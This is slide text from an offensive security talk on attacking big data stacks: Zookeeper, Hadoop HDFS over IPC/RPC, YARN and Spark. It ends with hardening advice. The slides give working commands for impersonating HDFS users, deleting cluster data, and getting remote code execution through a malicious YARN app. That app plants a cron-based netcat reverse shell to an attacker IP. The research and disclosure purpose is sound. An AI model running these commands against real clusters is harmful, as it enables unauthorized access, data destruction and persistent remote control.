THE UNBELIEVABLE 
INSECURITY OF THE 
BIG DATA STACK
AN OFFENSIVE APPROACH TO ANALYZING 
HUGE AND COMPLEX INFRASTRUCTURES
SHEILA A. BERTA (@UnaPibaGeek)
WHO AM I?
Head of Security Research at Dreamlab Technologies (Swiss Infosec Company)
SHEILA A. BERTA (@UnaPibaGeek)
●
Offensive Security Researcher - I like to break everything :)
●
Developer in ASM (Microcontrollers / x86/x64), C/C++, Python and Go
●
RE, Hardware Hacking & Exploit Development
●
DCA, CKA, CKAD (Cloud Native Specialist)
●
Speaker at BH USA Briefings (x4), DEF CON (x4), HITB, SCSD & more
LAYERS OF THE BIG DATA STACK
Data Storage
Data Ingestion
Data Processing
Data Access
Cluster Management
1
2
3
4
5
LAYERS OF THE BIG DATA STACK
Data Storage
Data Ingestion
Data Processing
Data Access
Cluster Management
1
2
3
4
5
EMR
BIG DATA ARCHITECTURES
FRONT-END
GO REST API
PRESTO
COORDINATOR
PRESTO
WORKERS
YARN
HDFS
THE ANALYSIS METHODOLOGY
CLUSTER MANAGEMENT
DATA STORAGE
DATA PROCESSING
DATA ACCESS
Analysis of the management layer’s 
components. E.g.: Zookeeper, Ambari, etc. 
Analysis of the data ingestion’s components. 
E.g.: Flume, Kafka, Kinesis, Sqoop, etc.
Analysis of the data storage’s components. 
E.g.: HDFS and HDFS-based storage, S3, etc. 
Analysis of the data processing’s 
components. E.g.: Spark, Storm, Flink, etc.
Analysis of the data access’ components. 
E.g.: Impala, Presto, Druid, etc. 
DATA INGESTION
MANAGEMENT LAYER
01
UNVEILING THE INSECURITY OF ZOOKEEPER AND AMBARI: 
ATTACKING THE CLUSTER’S HEART
ZOOKEEPER ARCHITECTURE AND PORTS
NODE 1
NODE 2
NODE 3
NODE N
ZOOKEEPER
SERVICE
ZOOKEEPER
CLIENT
ATTACKING ZOOKEEPER
https://zookeeper.apache.org/releases.html#download
./zkCli.sh -server :2181
ATTACKING ZOOKEEPER
BROWSE ZNODES
CREATE ZNODES
EDIT ZNODES
DELETE ZNODES
ls and get commands
create ./znode_path new_config_data
set ./znode_path config_data_edit
delete ./znode_path
THE SECOND DOOR OF AMBARI
THE SECOND DOOR OF AMBARI
03
01
02
STORAGE LAYER
02
INSECURITY IN THE DATA STORAGE LAYER: ABUSING HADOOP RPC/IPC
HADOOP ARCHITECTURE
YARN
HDFS
RESOURCE MANAGER
NODE MANAGER
NAMENODE
DATANODE
MASTER NODE
MASTER NODE
SLAVE NODE
SLAVE NODE
SLAVE NODE
SLAVE NODE
NAMENODE
RESOURCE MANAGER
NAMENODE
RESOURCE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
HADOOP IPC/RPC
NAME NODE
DATA NODES
namenode-address; port: 8020
hadoop fs –ls /
hadoop fs –mkdir /hacked
hadoop fs –rm –r /data
core-site
xml
hdfs-site
xml
mapred-site
xml
yarn-site
xml
CRAFTING HADOOP XML FILES
fs.defaultFS
hdfs://NAMESPACE
true
core-site
xml
CRAFTING HADOOP XML FILES
hdfs-site
xml
dfs.nameservices
NAMESPACE
dfs.ha.namenodes.NAMESPACE
NAMENODE1-ID,NAMENODE2-ID
dfs.namenode.rpc-address.NAMESPACE.NAMENODE1-ID
NAMENODE1-DNS:8020
dfs.client.failover.proxy.provider.NAMESPACE
org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider
CRAFTING HADOOP XML FILES
hdfs-site
xml
CRAFTING HADOOP XML FILES
mapred-site
xml
">
mapreduce.jobhistory.address
NAMENODE-DNS:10020
CRAFTING HADOOP XML FILES
yarn-site
xml
yarn.resourcemanager.address
NAMENODE-DNS:8050
yarn.resourcemanager.hostname
NAMENODE-DNS
REMOTELY COMPROMISING HADOOP VIA IPC/RPC
Dockerfile
REMOTELY COMPROMISING HADOOP VIA IPC/RPC
$ docker image build -t hadoop_lab .
$ docker container run -it --name hadoop-lab --net=host hadoop_lab /bin/bash
[root@docker]# mkdir config && cd config # Place the xml files in this directory
[root@docker]# cp /opt/hadoop-3.2.2/etc/hadoop/log4j.properties ./
[root@docker]# vi /etc/hosts
# Example:
192.168.162.110  c2100-hadoopmaster.c2100-hadoopmaster.localdomain
192.168.162.111  c2100-hadoopresman.c2100-hadoopresman.localdomain
REMOTELY COMPROMISING HADOOP VIA IPC/RPC
[root@docker]# hadoop –-config . fs –ls /
IMPERSONATING HADOOP USERS
[root@docker]# HADOOP_USER_NAME=hdfs hadoop –-config . fs –mkdir /hacked
PROCESSING LAYER
03
DEVELOPING A MALICIOUS YARN APPLICATION
HADOOP ARCHITECTURE
YARN
HDFS
RESOURCE MANAGER
NODE MANAGER
NAMENODE
DATANODE
MASTER NODE
MASTER NODE
SLAVE NODE
SLAVE NODE
SLAVE NODE
SLAVE NODE
NAMENODE
RESOURCE MANAGER
NAMENODE
RESOURCE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
HADOOP ARCHITECTURE
YARN
HDFS
RESOURCE MANAGER
NODE MANAGER
NAMENODE
DATANODE
MASTER NODE
MASTER NODE
SLAVE NODE
SLAVE NODE
SLAVE NODE
SLAVE NODE
NAMENODE
RESOURCE MANAGER
NAMENODE
RESOURCE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
DATANODE
NODE MANAGER
IMPROVING YARN-SITE XML FILE
yarn-site
xml
yarn.application.classpath
$HADOOP_CONF_DIR, /usr/hdp/3.1.4.0-315/hadoop/*, 
/usr/hdp/3.1.4.0-315/hadoop/lib/*, 
/usr/hdp/current/hadoop-hdfs-client/*,
/usr/hdp/current/hadoop-hdfs-client/lib/*, 
/usr/hdp/current/hadoop-yarn-client/*,
/usr/hdp/current/hadoop-yarn-client/lib/*
yarn.nodemanager.remote-app-log-dir
/app-logs
http://NAMENODE-IP:50070/conf
http://RESMAN-IP:8088/conf
YARN APPLICATION
https://github.com/hortonworks/simple-yarn-app
COMPILING THE YARN APPLICATION
[root@docker]# git clone https://github.com/hortonworks/simple-yarn-app
[root@docker]# cd simple-yarn-app
[root@docker]# vi pom.xml
org.apache.hadoop
hadoop-yarn-client
2.2.0
org.apache.hadoop
hadoop-common
2.2.0
[root@docker]# mvn package
ACHIEVING RCE VIA YARN
[root@docker]# HADOOP_USER_NAME=hdfs hadoop --config . fs -copyFromLocal /path/to/simple-
yarn-app-1.1.0.jar /jars/
[root@docker]#
HADOOP_USER_NAME=hdfs
hadoop
--config
.
jar
/local/path/to/simple-yarn-
app-1.1.0.jar
com.hortonworks.simpleyarnapp.Client
/jars/simple-
yarn-app-1.1.0.jar
ACHIEVING RCE VIA YARN
[root@docker]# HADOOP_USER_NAME=hdfs yarn --config . logs -applicationId 
-log_files stdout
MALICIOUS YARN APPLICATION
ApplicationMaster.java
Client.java
(crontab -l && echo "0 0 * * * nc -nv attacker_ip 1337 -e /bin/bash") | crontab -
WHAT ABOUT APACHE SPARK?
SPARK MASTER
WORKER NODES
spark-master-address; port: 7077
Spark Master IP
Attacker IP
Command
https://youtu.be/EAzdGo-i8vE
 show databases;
> use prod;
> show tables;
CONCLUSION
FINAL THOUGHTS AND RECOMMENDATIONS
SECURITY RECOMMENDATIONS
04
05
06
IMPLEMENT 
AUTHENTICATION
Most technologies support 
advanced authentication 
mechanisms.
MANAGE AUTHORIZATION
Apply the principle of least 
privilege.
SECURE COMMUNICATIONS
Secure the communication channels 
between the different technologies.
01
02
03
REDUCE THE ATTACK 
SURFACE
Remove dashboards and 
interfaces that are not used.
SET UP A FIREWALL
Block unnecessary ports and 
secure the perimeter.
SECURE CREDENTIALS
Change all the default credentials 
in the technologies implemented.
SHEILA A. BERTA (@UnaPibaGeek)
PI:EMAIL / PI:EMAIL
www.dreamlab.net
THANKS!